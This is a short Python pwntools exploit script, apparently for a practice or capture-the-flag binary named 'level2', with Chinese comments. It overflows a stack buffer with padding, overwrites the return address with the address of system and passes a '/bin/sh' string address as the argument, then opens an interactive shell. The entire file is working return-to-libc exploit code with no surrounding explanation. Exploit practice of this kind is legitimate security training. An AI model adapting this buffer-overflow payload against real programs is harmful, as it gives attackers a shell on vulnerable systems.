from pwn import *

r=process( './level2' )
sys_address =0x08048320
bin_sh = 0x0804A024
r.recvline()
# a是蓋過stack區域, b是蓋過return address
payload = "a" * 0x88 + "b"*4
# p32(0)是ebp+4  後面接參數(/bin/sh)
payload += (p32(sys_address)+p32(0)+p32(bin_sh)).decode('unicode_escape')

# print(payload)

r.send(payload)
r.interactive()
